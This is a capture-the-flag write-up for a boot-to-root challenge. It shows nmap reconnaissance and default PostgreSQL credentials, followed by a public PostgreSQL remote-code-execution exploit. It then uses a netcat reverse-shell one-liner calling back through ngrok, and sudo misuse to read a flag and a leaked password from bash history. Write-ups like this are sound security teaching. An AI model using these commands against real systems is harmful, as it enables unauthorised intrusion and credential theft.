# Intro
```
Boot2Root/Haxquash - User

viipz, rvino

**Techarisma Chapter 6/7**

Well done finding one of their servers. Let's try a takeover - get a foothold on the box and locate the user.txt!

Brute forcing / Fuzzing is allowed on this challenge.
```

The challenge is to hack your way into the computer and read the user.txt flag located in someones home directory.
# Lets go
We start off with an NMAP scan to find what is currently runing on the machine
```bash
┌──(kali㉿kali)-[~]
└─$ nmap -sC -sV 52.31.185.33
Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-05 12:46 EDT
Nmap scan report for ec2-52-31-185-33.eu-west-1.compute.amazonaws.com (52.31.185.33)
Host is up (0.068s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 5a:5b:0f:5e:0a:47:94:46:de:b2:6c:70:cf:b1:c0:bb (ECDSA)
|_  256 f6:83:e2:14:88:d9:33:06:30:47:c5:9f:62:36:ef:7d (ED25519)
80/tcp   open  http       Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
5432/tcp open  postgresql PostgreSQL DB 9.6.0 or later
| fingerprint-strings: 
|   SMBProgNeg: 
|     SFATAL
|     VFATAL
|     C0A000
|     Munsupported frontend protocol 65363.19778: server supports 2.0 to 3.0
|     Fpostmaster.c
|     L2093
|_    RProcessStartupPacket
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port5432-TCP:V=7.92%I=7%D=11/5%Time=636693A5%P=x86_64-pc-linux-gnu%r(SM
SF:BProgNeg,8C,"E\0\0\0\x8bSFATAL\0VFATAL\0C0A000\0Munsupported\x20fronten
SF:d\x20protocol\x2065363\.19778:\x20server\x20supports\x202\.0\x20to\x203
SF:\.0\0Fpostmaster\.c\0L2093\0RProcessStartupPacket\0\0");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 41.36 seconds
zsh: segmentation fault  nmap -sC -sV 52.31.185.33
```

So postgresql is running, googling standard creds reveals that we can probably use postgres:postgres as username and password.
Further googling the version, we find out that it is vulnerable for remote code execution:
https://www.exploit-db.com/exploits/50847

Using that exploit we get code execution

```bash
┌──(kali㉿kali)-[~]
└─$ python3 ./50847.py -i 52.31.185.33 -c whoami                                                                                                                                                                                        

[+] Connecting to PostgreSQL Database on 52.31.185.33:5432
[+] Connection to Database established
[+] Checking PostgreSQL version
[+] PostgreSQL 10.2 is likely vulnerable
[+] Creating table _7f3aed8c53f9910e20f80ae1042cea1b
[+] Command executed

postgres

[+] Deleting table _7f3aed8c53f9910e20f80ae1042cea1b
```


So to get reverse shell we can use a bash oneliner from pentestmonkey and link that with a ngrok tcp listener:

The listener:
```bash
./ngrok tcp 8081
nc -nvlp 8081
```

And the command for the reverse shell:
```bash
python3 ./50847.py -i 54.217.11.23 -c "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 0.tcp.eu.ngrok.io 16354 >/tmp/f"
```

Once in, we can enumerate with linpeas or simply list what sudo commands we can run with: `sudo -l`

This gives us that the user postgres can run /bin/cat as helix
This gives us the opportunity to either cat the flag directly
`sudo -u helix /bin/cat /home/helix/user.txt`
`EPT{I_like_my_sugar_with_coffee_and_cream}`
Or go for his history file and get his password to log in with and cat the flag like that
```bash
sudo -u helix /bin/cat /home/helix/.bash_history
psql -h 127.0.0.1 -p 5432 -U helix -W c4nt_broooot_th15_sh1t! -d postgres
```
